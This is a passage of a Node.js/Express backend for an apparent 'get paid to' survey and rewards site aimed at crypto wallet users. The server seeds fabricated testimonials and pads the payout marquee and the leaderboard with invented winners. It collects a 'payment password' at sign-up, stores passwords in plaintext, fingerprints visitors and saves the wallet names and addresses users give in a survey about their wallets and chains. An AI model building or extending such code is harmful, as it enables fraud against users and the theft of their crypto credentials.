Ol", loginTitle: "Giriş Yap", loginBtn: "Giriş Yap", labelEmail: "E-posta", labelPass: "Şifre", labelConfirm: "Şifreyi Onayla", labelPayPass: "Ödeme Şifresi", surveyTitle: "Lütfen anketi doldurun", surveyDesc: "2 dakika sürer", submitSurvey: "Gönder", readMore: "Devamını Oku", dashTitle: "Kazan", dashDesc: "Para kazanmak için teklifleri ve anketleri tamamlayın.", offerWall: "Teklifler", taskAvailable: "Mevcut", watchVideo: "Video İzle", startTask: "Başla", withdrawTitle: "Çekim", withdrawMethod: "Yöntem", withdrawAmount: "Miktar (Min 500)", withdrawAccount: "Hesap/Adres", submitApply: "Gönder", searchPlaceholder: "Teklif ara", catAll: "Tümü", catGame: "Oyunlar", catApp: "Uygulamalar", catSignup: "Kayıt", startEarning: "Kazanmaya Başla", lbTitle: "Şanslı Kullanıcılar", lbDesc: "Diğerleriyle rekabet et.", daily: "Günlük", monthly: "Aylık", rankUser: "Sıra / Kullanıcı", earnings: "Kazanç", you: "Sen", backHome: "Geri Dön", exit: "Çıkış" };

// 初始化全量默认数据
Object.keys(DB_FILES).forEach(key => {
    if (!fs.existsSync(DB_FILES[key])) {
        let initialData = [];
        if (key === 'admin') initialData = { password: 'admin888' };
        if (key === 'settings') initialData = { reviewMode: 'all' };
        if (key === 'surveys') initialData = {
            questions: { 
                zh: [
                    { 
                        id: "q1", 
                        title: "您平时最经常使用的加密钱包是哪一款？", 
                        options: ["Bitget / Bitpie 钱包", "Trust Wallet / Phantom(幻影)钱包", "Solflare / Coin98 钱包", "Uniswap / Exodus(出埃及记)钱包"] 
                    }, 
                    { 
                        id: "q2", 
                        title: "您使用加密钱包的主要用途是什么？", 
                        options: ["DApp交互与 DeFi理财", "代币 Swap(交换)闪兑交易", "NFT收藏与交易", "资产长期存储与转账"] 
                    },
                    { 
                        id: "q3", 
                        title: "您参与加密货币市场交易多久了？", 
                        options: ["少于 1 年 (新手)", "1到3年", "3年以上 (老玩家)"] 
                    },
                    { 
                        id: "q4", 
                        title: "您最常用的区块链网络是哪一条？", 
                        options: ["以太坊主网(ETH) 或 L2网络", "Solana高速链 (SOL)", "BNB Chain (BSC)", "波场 TRON (TRX)或其他"] 
                    },
                    { 
                        id: "q5", 
                        title: "选择加密钱包时，您最看重的特性是什么？", 
                        options: ["安全防盗与审计认证", "转账速度快与 Gas 费低", "多链与跨链支持", "界面简洁易用"] 
                    }
                ] 
            },
            submissions: []
        };
        if (key === 'languages') initialData = [
            { code: 'zh', name: '简体中文', flag: '🇨🇳', active: true, dict: dictZh },
            { code: 'en-US', name: 'English (US)', flag: '🇺🇸', active: true, dict: dictEn },
            { code: 'vi', name: 'Tiếng Việt', flag: '🇻🇳', active: true, dict: dictVi },
            { code: 'en-GB', name: 'English (UK)', flag: '🇬🇧', active: true, dict: dictEn },
            { code: 'de', name: 'Deutsch', flag: '🇩🇪', active: true, dict: dictDe },
            { code: 'ar', name: 'العربية', flag: '🇦🇪', active: true, dict: dictAr },
            { code: 'es', name: 'Español', flag: '🇦🇷', active: true, dict: dictEs },
            { code: 'pt', name: 'Português', flag: '🇧🇷', active: true, dict: dictPt },
            { code: 'ko', name: '한국어', flag: '🇰🇷', active: true, dict: dictKo },
            { code: 'uk', name: 'Українська', flag: '🇺🇦', active: true, dict: dictUk },
            { code: 'tr', name: 'Türkçe', flag: '🇹🇷', active: true, dict: dictTr }
        ];
        if (key === 'reviews') {
            initialData = [
                { id: uuidv4(), lang: 'en-US', stars: 5, name: 'Matthew Betancourt', text: "The Best GPT site without question. I've been using it for about 2 months and it is my go-to starting point for figuring what offers I'll work on as passive income." },
                { id: uuidv4(), lang: 'en-US', stars: 5, name: 'Parvez Shah', text: "Gain.gg is a good website for earning small rewards by doing simple tasks like surveys and watching videos. It's a nice option for students or anyone looking to earn a little extra." },
                { id: uuidv4(), lang: 'en-US', stars: 5, name: 'Joe', text: "Gain is a fantastic website. I haven't had any issues, mods are always responsive, and they collect a ton of different resources for you to earn." },
                { id: uuidv4(), lang: 'en-US', stars: 5, name: 'Cristiano Raimondo', text: "Best GPT website i've ever seen, they don't even ask for verification to withdraw money. Cherries is the best way to earn." },
                { id: uuidv4(), lang: 'zh', stars: 5, name: '王小明', text: "毫无疑问是最好的空投网站。我已经使用了大约 2 个月，提现速度非常快，强烈推荐！" },
                { id: uuidv4(), lang: 'zh', stars: 5, name: '李华', text: "做任务很方便，问卷也很简单。对于想赚点零花钱的学生党来说是个不错的选择。" },
                { id: uuidv4(), lang: 'de', stars: 5, name: 'Lukas', text: "Eine großartige Website, um mit einfachen Aufgaben etwas Geld zu verdienen. Die Auszahlung erfolgt sehr schnell." },
                { id: uuidv4(), lang: 'vi', stars: 5, name: 'Nguyen Van A', text: "Trang web tuyệt vời, kiếm tiền dễ dàng và rút tiền rất nhanh qua PayPal." }
            ];
        }
        if (key === 'articles') initialData = [];
        if (key === 'offers') initialData = [];
        if (key === 'partners') initialData = [];
        if (key === 'visits') initialData = [];
        fs.writeFileSync(DB_FILES[key], JSON.stringify(initialData, null, 2));
    }
});

const readDB = (key) => JSON.parse(fs.readFileSync(DB_FILES[key]));
const writeDB = (key, data) => fs.writeFileSync(DB_FILES[key], JSON.stringify(data, null, 2));

app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static(UPLOAD_DIR));

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => cb(null, `${uuidv4()}${path.extname(file.originalname)}`)
});
const upload = multer({ storage });

function getReqInfo(req) {
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    if (typeof ip === 'string' && ip.includes(',')) ip = ip.split(',')[0].trim();
    return { ip };
}

// ================= 前台 API =================
app.get('/api/languages', (req, res) => res.json(readDB('languages').filter(l => l.active)));
app.get('/api/partners', (req, res) => res.json(readDB('partners')));

app.get('/api/reviews', (req, res) => {
    const reviews = readDB('reviews');
    const settings = readDB('settings') || {};
    const reviewMode = settings.reviewMode || 'all';
    const lang = req.query.lang;

    if (reviewMode === 'match' && lang) {
        let filtered = reviews.filter(r => r.lang === lang);
        if (filtered.length === 0) {
            const mainLang = String(lang).split('-')[0];
            filtered = reviews.filter(r => String(r.lang || '').split('-')[0] === mainLang);
        }
        return res.json(filtered);
    }
    res.json(reviews);
});

app.get('/api/marquee', (req, res) => {
    const users = readDB('users').slice(-10).reverse();
    let list = users.map(u => ({ name: u.email.split('@')[0], amount: (Math.random() * 500).toFixed(0) }));
    const fakeNames = ['Lutali', 'Chimmy', 'Peter', 'Hoang Ha', 'Anon', 'Whe...', 'Safa'];
    while (list.length < 15) { list.push({ name: fakeNames[Math.floor(Math.random()*fakeNames.length)], amount: (Math.random() * 2000).toFixed(0) }); }
    res.json(list);
});
app.get('/api/offers', (req, res) => res.json(readDB('offers')));

app.get('/api/survey/questions', (req, res) => {
    const lang = req.query.lang || 'zh';
    const surveys = readDB('surveys');
    let questions = surveys.questions[lang];
    if (!questions) questions = surveys.questions['zh'] || [];
    res.json(questions);
});

/* ================= 访问追踪接口 ================= */
app.post('/api/track',
    express.json({ limit: '100kb' }),
    express.text({ type: 'text/plain', limit: '100kb' }),
    (req, res) => {
        let body = req.body;
        if (typeof body === 'string') {
            try { body = JSON.parse(body); } catch (_) { body = {}; }
        }
        if (!body || typeof body !== 'object' || Array.isArray(body)) body = {};

        const { action, fingerprint, device, os, osVersion, browser, browserVersion, country, lang, id, email } = body;
        const visits = readDB('visits');
        const reqInfo = getReqInfo(req);

        if (action === 'visit') {
            const finalIp = (reqInfo.ip && reqInfo.ip !== 'Unknown') ? reqInfo.ip : (body.ip || 'Unknown');
            const finalCountry = (country && country !== 'Unknown') ? country : 'Unknown';
            const newVisit = {
                id: id || uuidv4(), fingerprint: fingerprint || null, device: device || 'Unknown', os: os || 'Unknown',
                osVersion: osVersion || 'Unknown', browser: browser || 'Unknown', browserVersion: browserVersion || 'Unknown',
                country: finalCountry, lang: lang || 'zh', ip: finalIp, visitTime: new Date().toISOString(), submitTime: null, status: '访问中'
            };
            visits.push(newVisit);
            writeDB('visits', visits);
            return res.json({ success: true, id: newVisit.id });
        }

        if (action === 'submit') {
            const existing = visits.find(v => v.fingerprint === fingerprint && v.status === '访问中');
            if (existing) {
                existing.submitTime = new Date().toISOString(); existing.status = '已注册'; existing.email = email;
            } else {
                visits.push({
                    id: uuidv4(), fingerprint, device, os, osVersion, browser, browserVersion,
                    country: country || 'Unknown', lang, ip: reqInfo.ip, visitTime: new Date().toISOString(),
                    submitTime: new Date().toISOString(), status: '已注册', email
                });
            }
            writeDB('visits', visits);
            return res.json({ success: true });
        }

        if (action === 'leave') {
            const existing = visits.find(v => v.id === id);
            if (existing) {
                const start = new Date(existing.visitTime).getTime();
                existing.duration = Math.max(0, Math.floor((Date.now() - start) / 1000));
                writeDB('visits', visits);
            }
            return res.json({ success: true });
        }

        return res.json({ success: false });
    }
);

app.post('/api/register', (req, res) => {
    const { email, password, payPassword, fingerprint, country, lang, device, os, osVersion, browser, browserVersion } = req.body;
    const users = readDB('users');
    if (users.find(u => u.email === email)) return res.status(400).json({ error: '邮箱已注册' });

    const newUser = { id: uuidv4(), email, password, payPassword: payPassword || '', balance: 0, totalEarned: 0, time: new Date().toISOString() };
    users.push(newUser); writeDB('users', users);

    const visits = readDB('visits');
    const existing = visits.find(v => v.fingerprint === fingerprint && (v.status === '访问中' || !v.submitTime));
    const reqInfo = getReqInfo(req);
    if (existing) {
        existing.status = '已注册'; existing.email = email; existing.submitTime = new Date().toISOString();
    } else {
        visits.push({ id: uuidv4(), fingerprint, device, os, osVersion, browser, browserVersion, country, lang, ip: reqInfo.ip, visitTime: new Date().toISOString(), submitTime: new Date().toISOString(), status: '已注册', email });
    }
    writeDB('visits', visits);

    res.json({ success: true, user: newUser });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    const users = readDB('users');
    const user = users.find(u => u.email === email && u.password === password);
    if (user) res.json({ success: true, user: { email: user.email, balance: user.balance || 0 } });
    else res.status(401).json({ error: '邮箱或密码错误' });
});

app.get('/api/leaderboard', (req, res) => {
    const period = req.query.period || 'daily';
    const users = readDB('users');
    let list = users.map(u => ({ name: u.email.split('@')[0], amount: period === 'daily' ? (u.balance || 0) : (u.totalEarned || 0), avatar: u.email[0].toUpperCase(), isReal: true }));
    const fakeNames = ['Johnny Midan', 'Bebazz YT', 'Awatix', 'Puppylover'];
    while (list.length < 100) { list.push({ name: fakeNames[Math.floor(Math.random()*fakeNames.length)] + Math.floor(Math.random()*99), amount: Math.floor(Math.random() * 50000) + 1000, avatar: 'U', isReal: false }); }
    list.sort((a, b) => b.amount - a.amount); res.json(list.slice(0, 100));
});

app.post('/api/user/tasks/complete', (req, res) => {
    const { email, reward } = req.body;
    const users = readDB('users');
    const user = users.find(u => u.email === email);
    if (user) { user.balance = (user.balance || 0) + reward; user.totalEarned = (user.totalEarned || 0) + reward; writeDB('users', users); res.json({ success: true, balance: user.balance, totalEarned: user.totalEarned }); }
    else res.status(404).json({ error: '用户不存在' });
});

// 修改：增加了 wallet 和 walletAddress 的接收和保存
app.post('/api/survey', (req, res) => {
    const { answers, email, fingerprint, wallet, walletAddress } = req.body;
    const surveyData = readDB('surveys');
    surveyData.submissions.push({ 
        id: uuidv4(), 
        email: email || '游客', 
        answers, 
        wallet: wallet || '', 
        walletAddress: walletAddress || '', 
        time: new Date().toISOString() 
    });
    writeDB('surveys', surveyData);

    if (fingerprint) {
        const visits = readDB('visits');
        const existing = visits.find(v => v.fingerprint === fingerprint);
        if (existing) {
            existing.status = '已答题'; existing.answerTime = new Date().toISOString();
            if(email) existing.email = email;
            writeDB('visits', visits);
        }
    }
    res.json({ success: true });
});

app.get('/api/articles/latest', (req, res) => {
    const { lang = 'zh' } = req.query;
    const articles = readDB('articles').filter(a => a.lang === lang).sort((a,b) => new Date(b.time) - new Date(a.time));
    res.json(articles.slice(0, 3) || []);
});
app.get('/api/articles/:id', (req, res) => res.json(readDB('articles').find(a => a.id === req.params.id) || null));

// ================= 后台 API =================
const auth = (req, res, next) => {
    const pwd = req.headers['x-admin-pwd'] || req.query.pwd;
    const adminData = readDB('admin');
    if (pwd !== adminData.password) return res.status(403).json({ error: '密码错误' });
    next();
};

app.post('/api/admin/password', auth, (req, res) => {
    const { newPassword } = req.body;
    if (!newPassword) return res.status(400).json({ error: '密码不能为空' });
    writeDB('admin', { password: newPassword });
    res.json({ success: true });
});

app.post('/api/admin/upload', auth, upload.single('image'), (req, res) => res.json({ url: `/uploads/${req.file.filename}` }));

app.get('/api/admin/data', auth, (req, res) => {
    res.json({
        users: readDB('users'), articles: readDB('articles'), surveys: readDB('surveys'),
        offers: readDB('offers'), languages: readDB('languages'), partners: readDB('partners'), visits: readDB('visits'),
        reviews: readDB('reviews'),
        settings: readDB('settings')
    });
});

app.put('/api/admin/settings', auth, (req, res) => {
    const settings = readDB('settings');
    const newSettings = { ...settings, ...req.body };
    writeDB('settings', newSettings);
    res.json({ success: true });
});

// 文章整组更新/机翻新增（多服务轮询）
app.put('/api/admin/article/group/:groupId', auth, async (req, res) => {
    const groupId = req.params.groupId;
    const { sourceLang, targetLangs, title, summary, content, coverUrl } = req.body;
    const articles = readDB('articles');
    
    const groupArticles = articles.filter(a => (a.groupId || a.id) === groupId);
    if (groupArticles.length === 0) return res.status(404).json({ error: '组不存在' });
    
    let sourceArticle = groupArticles.find(a => a.lang === sourceLang);
    if (!sourceArticle) {
        sourceArticle = { id: uuidv4(), groupId, lang: sourceLang, title, summary, content, coverUrl, time: new Date().toISOString() };
        articles.push(sourceArticle);
    } else {
        sourceArticle.title = title;
        sourceArticle.summary = summary;
        sourceArticle.content = content;
        sourceArticle.coverUrl = coverUrl;
        sourceArticle.time = new Date().toISOString();
    }
    
    const foreignLangs = targetLangs.filter(l => l !== sourceLang);
    
    try {
        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const [tTitle, tSummary, tContent] = await Promise.all([
                translateWithPolling(title, googleLang, sourceLang),
                translateWithPolling(summary, googleLang, sourceLang),
                translateWithPolling(content, googleLang, sourceLang)
            ]);
            
            let existing = groupArticles.find(a => a.lang === lang);
            if (existing) {
                existing.title = tTitle;
                existing.summary = tSummary;
                existing.content = tContent;
                existing.coverUrl = coverUrl;
                existing.time = new Date().toISOString();
            } else {
                articles.push({ id: uuidv4(), groupId, lang, title: tTitle, summary: tSummary, content: tContent, coverUrl, time: new Date().toISOString() });
            }
            await new Promise(r => setTimeout(r, 500));
        }
        writeDB('articles', articles);
        res.json({ success: true });
    } catch (e) {
        console.error('[文章整组] 翻译失败:', e);
        res.status(502).json({
            error: '翻译失败',
            reason: describeError(e),
            details: e.errors || [{ provider: e.provider, type: e.type, message: e.message }]
        });
    }
});

// 问卷删除整组
app.delete('/api/admin/survey/group', auth, (req, res) => {
    const surveys = readDB('surveys');
    surveys.questions = {};
    writeDB('surveys', surveys);
    res.json({ success: true });
});

// 问卷翻译与保存（多服务轮询）
app.post('/api/admin/survey/translate', auth, async (req, res) => {
    const { questions, targetLangs, sourceLang = 'zh' } = req.body;
    const surveys = readDB('surveys');
    surveys.questions[sourceLang] = questions;
    const foreignLangs = targetLangs.filter(lang => lang !== sourceLang);

    try {
        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const translated = [];
            for (let q of questions) {
                const tTitle = await translateWithPolling(q.title, googleLang, sourceLang);
                const tOptions = [];
                for (let opt of q.options) {
                    tOptions.push(await translateWithPolling(opt, googleLang, sourceLang));
                }
                translated.push({ id: q.id, title: tTitle, options: tOptions });
            }
            surveys.questions[lang] = translated;
        }
        writeDB('surveys', surveys);
        res.json({ success: true });
    } catch (e) {
        console.error('[问卷] 翻译失败:', e);
        res.status(502).json({
            error: '翻译失败',
            reason: describeError(e),
            details: e.errors || [{ provider: e.provider, type: e.type, message: e.message }]
        });
    }
});

app.post('/api/admin/languages', auth, (req, res) => {
    const { code, name, flag } = req.body;
    const languages = readDB('languages');
    if (languages.find(l => l.code === code)) return res.status(400).json({ error: '代码已存在' });
    const defaultDict = languages[0].dict;
    languages.push({ code, name, flag: flag || '🌐', active: true, dict: defaultDict });
    writeDB('languages', languages);
    res.json({ success: true });
});

app.put('/api/admin/languages/:code', auth, (req, res) => {
    const { active, dict, name, flag } = req.body; const languages = readDB('languages');
    const index = languages.findIndex(l => l.code === req.params.code);
    if (index !== -1) { languages[index] = { ...languages[index], active: active !== undefined ? active : languages[index].active, name: name || languages[index].name, flag: flag || languages[index].flag, dict: dict || languages[index].dict }; writeDB('languages', languages); res.json({ success: true }); }
    else res.status(404).json({ error: '语言不存在' });
});

// 文章新建 + 多语言机翻（多服务轮询）
app.post('/api/admin/article/translate', auth, async (req, res) => {
    const { title, summary, content, coverUrl, targetLangs } = req.body;
    const articles = readDB('articles');
    const groupId = uuidv4();
    if (targetLangs.includes('zh')) { articles.push({ id: uuidv4(), groupId, lang: 'zh', title, summary, content, coverUrl, time: new Date().toISOString() }); }
    const foreignLangs = targetLangs.filter(lang => lang !== 'zh');
    try {
        const translatedArticles = [];
        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const [tTitle, tSummary, tContent] = await Promise.all([
                translateWithPolling(title, googleLang, 'zh'),
                translateWithPolling(summary, googleLang, 'zh'),
                translateWithPolling(content, googleLang, 'zh')
            ]);
            translatedArticles.push({ id: uuidv4(), groupId, lang, title: tTitle, summary: tSummary, content: tContent, coverUrl, time: new Date().toISOString() });
            await new Promise(r => setTimeout(r, 500));
        }
        articles.push(...translatedArticles);
        writeDB('articles', articles);
        res.json({ success: true });
    } catch (e) {
        console.error('[文章新建] 翻译失败:', e);
        res.status(502).json({
            error: '翻译失败',
            reason: describeError(e),
            details: e.errors || [{ provider: e.provider, type: e.type, message: e.message }]
        });
    }
});

app.put('/api/admin/article/:id', auth, (req, res) => {
    const { lang, title, summary, content, coverUrl } = req.body;
    const articles = readDB('articles');
    const index = articles.findIndex(a => a.id === req.params.id);
    if (index !== -1) { articles[index] = { ...articles[index], lang, title, summary, content, coverUrl }; writeDB('articles', articles); res.json({ success: true }); }
    else res.status(404).json({ error: '文章不存在' });
});
app.delete('/api/admin/article/:id', auth, (req, res) => {
    let articles = readDB('articles').filter(a => a.id !== req.params.id); writeDB('articles', articles); res.json({ success: true });
});
app.delete('/api/admin/article-group/:groupId', auth, (req, res) => {
    let articles = readDB('articles').filter(a => a.groupId !== req.params.groupId && a.id !== req.params.groupId);
    writeDB('articles', articles); res.json({ success: true });
});

app.post('/api/admin/partners', auth, (req, res) => {
    const { name, imageUrl } = req.body; const partners = readDB('partners');
    partners.push({ id: uuidv4(), name, imageUrl }); writeDB('partners', partners); res.json({ success: true });
});
app.put('/api/admin/partners/:id', auth, (req, res) => {
    const { name, imageUrl } = req.body; const partners = readDB('partners');
    const index = partners.findIndex(p => p.id === req.params.id);
    if (index !== -1) { partners[index] = { ...partners[index], name, imageUrl }; writeDB('partners', partners); res.json({ success: true }); }
    else res.status(404).json({ error: '不存在' });
});
app.delete('/api/admin/partners/:id', auth, (req, res) => {
    let partners = readDB('partners').filter(p => p.id !== req.params.id); writeDB('partners', partners); res.json({ success: true });
});

// ====== 评论管理 API（多服务轮询） ======
app.post('/api/admin/reviews', auth, async (req, res) => {
    const { targetLangs, stars, name, text } = req.body;
    const reviews = readDB('reviews');
    const groupId = uuidv4();
    const sourceLang = 'zh';
    const foreignLangs = targetLangs.filter(lang => lang !== sourceLang);

    try {
        if (targetLangs.includes(sourceLang)) {
            reviews.push({ id: uuidv4(), groupId, lang: sourceLang, stars: Number(stars) || 5, name, text });
        }

        for (let lang of foreignLangs) {
            const googleLang = lang.split('-')[0];
            const tText = await translateWithPolling(text, googleLang, sourceLang);
            const tName = await translateWithPolling(name, googleLang, sourceLang);
            reviews.push({ id: uuidv4(), groupId, lang, stars: Number(stars) || 5, name: tName, text: tText });
            await new Promise(r => setTimeout(r, 300));
        }

        writeDB('reviews', reviews);
        res.json({ success: true });
    } catch (e) {
        console.error('[评论] 翻译失败:', e);
        res.status(502).json({
            error: '翻译失败',
            reason: describeError(e),
            details: e.errors || [{ provider: e.provider, type: e.type, message: e.message }]
        });
    }
});

app.put('/api/admin/reviews/:id', auth, (req, res) => {
    const { lang, stars, name, text } = req.body;
    const reviews = readDB('reviews');
    const index = reviews.findIndex(r => r.id === req.params.id);
    if (index !== -1) { 
        reviews[index] = { ...reviews[index], lang, stars: Number(stars) || 5, name, text }; 
        writeDB('reviews', reviews); 
        res.json({ success: true }); 
    }
    else res.status(404).json({ error: '评论不存在' });
});

app.delete('/api/admin/reviews/:id', auth, (req, res) => {
    let reviews = readDB('reviews').filter(r => r.id !== req.params.id); 
    writeDB('reviews', reviews); 
    res.json({ success: true });
});

app.delete('/api/admin/review-group/:groupId', auth, (req, res) => {
    let reviews = readDB('reviews').filter(r => r.groupId !== req.params.groupId); 
    writeDB('reviews', reviews); 
    res.json({ success: true });
});

app.put('/api/admin/users/:id', auth, (req, res) => {
    const { balance } = req.body; const users = readDB('users');
    const index = users.findIndex(u => u.id === req.params.id);
    if (index !== -1) { users[index].balance = Number(balance); writeDB('users', users); res.json({ success: true }); }
    else res.status(404).json({ error: '用户不存在' });
});
app.post('/api/admin/offers', auth, (req, res) => {
    const { category, title, reward, color } = req.body; const offers = readDB('offers');
    offers.push({ id: uuidv4(), category, title, reward, color }); writeDB('offers', offers); res.json({ success: true });
});
app.delete('/api/admin/offers/:id', auth, (req, res) => {
    let offers = readDB('offers').filter(o => o.id !== req.params.id); writeDB('offers', offers); res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server on port ${PORT}`));
